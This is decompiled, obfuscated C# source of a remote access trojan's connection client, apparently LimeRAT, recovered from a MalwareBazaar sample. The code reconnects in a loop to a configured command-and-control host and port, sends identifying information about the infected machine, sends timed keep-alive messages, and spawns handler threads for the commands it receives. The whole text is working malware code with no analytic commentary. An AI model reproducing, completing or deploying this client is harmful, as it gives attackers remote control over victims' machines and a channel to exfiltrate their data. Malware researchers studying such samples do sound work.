// Decompiled with JetBrains decompiler
// Type: Lime.Connection.Client
// Assembly: ClientX, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EEC5B2E-8B21-4543-94D2-F5C89EF8D336
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.RRAT.gen-1ff51be88103ec4492613582af80f682292f70f7270ec457c7ca14a89fe324bb.exe

using Lime.Helper;
using Lime.Packets;
using Lime.Settings;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace Lime.Connection
{
  public static class Client
  {
    private static Socket \uE000;
    public static bool isConnected;
    private static MemoryStream \uE001;
    private static Timer \uE002;

    public static void Run() => new Thread(new ThreadStart(Client.\uE000)).Start();

    private static void \uE000()
    {
label_10:
      while (!Client.isConnected)
      {
        try
        {
          if (Client.\uE001 != null)
            Client.\uE001.Dispose();
          if (Client.\uE002 != null)
            Client.\uE002.Dispose();
        }
        catch
        {
        }
        try
        {
          Client.\uE000.Disconnect(false);
        }
        catch
        {
        }
        try
        {
          Client.\uE000 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          Client.\uE000.SendBufferSize = 999999;
          Client.\uE000.ReceiveBufferSize = 999999;
          Client.\uE000.Connect(Config.host, Convert.ToInt32(Config.port));
          Client.isConnected = true;
          Client.TcpSend(IdGenerator.SendInfo());
          Client.\uE002 = new Timer(new TimerCallback(Client.\uE001), (object) null, 30000, 30000);
          Client.\uE001 = new MemoryStream();
        }
        catch
        {
          Client.isConnected = false;
          Thread.Sleep(3000);
        }
      }
label_18:
      while (Client.isConnected)
      {
        try
        {
          if (Client.\uE000.Poll(-1, SelectMode.SelectRead) && Client.\uE000.Available <= 0 || !Client.\uE000.Connected)
          {
            Client.isConnected = false;
            break;
          }
          byte[] buffer = new byte[Client.\uE000.Available];
          Client.\uE000.Receive(buffer, 0, buffer.Length, SocketFlags.None);
          Client.\uE001.Write(buffer, 0, buffer.Length);
          while (true)
          {
            if (StringConverter.BytestoString(Client.\uE001.ToArray()).Contains(Config.splitter))
            {
              Array[] arrayArray = (Array[]) Client.\uE003(Client.\uE001.ToArray(), Config.splitter);
              new Thread(new ParameterizedThreadStart(new PacketHandler().Handler)).Start((object) arrayArray[0]);
              Client.\uE001.Dispose();
              Client.\uE001 = new MemoryStream();
              if (arrayArray.Length == 2)
                Client.\uE001.Write((byte[]) arrayArray[1], 0, ((byte[]) arrayArray[1]).Length);
              else
                goto label_18;
            }
            else
              goto label_18;
          }
        }
        catch
        {
          Client.isConnected = false;
          break;
        }
      }
      goto label_10;
    }

    private static void \uE001(object _param0)
    {
      Client.\uE002(StringConverter.StringToBytes(\uE002.\uE000("\uF416\uF418\uF418\uF40D\uF43C\uF411\uF414\uF40B\uF418\uF42D\uF414\uF413\uF41A\uF45C", 62525)));
      GC.Collect();
      GC.WaitForPendingFinalizers();
      GC.Collect();
    }

    private static void \uE002(byte[] _param0)
    {
      if (!Client.isConnected)
        return;
      try
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          memoryStream.Write(_param0, 0, _param0.Length);
          memoryStream.Write(StringConverter.StringToBytes(Config.splitter), 0, Config.splitter.Length);
          Client.\uE000.SendBufferSize = _param0.Length;
          Client.\uE000.Poll(-1, SelectMode.SelectWrite);
          Client.\uE000.Send(memoryStream.ToArray(), 0, (int) memoryStream.Length, SocketFlags.None);
        }
      }
      catch
      {
        Client.isConnected = false;
      }
    }

    public static void TcpSend(string S) => Client.\uE002(StringConverter.StringToBytes(S));

    private static Array \uE003(byte[] _param0, string _param1)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      string[] strArray = Strings.Split(StringConverter.BytestoString(_param0), _param1, Compare: CompareMethod.Text);
      memoryStream1.Write(_param0, 0, strArray[0].Length);
      memoryStream2.Write(_param0, strArray[0].Length + _param1.Length, _param0.Length - (strArray[0].Length + _param1.Length));
      numArrayList.Add(memoryStream1.ToArray());
      numArrayList.Add(memoryStream2.ToArray());
      memoryStream1.Dispose();
      memoryStream2.Dispose();
      return (Array) numArrayList.ToArray();
    }
  }
}
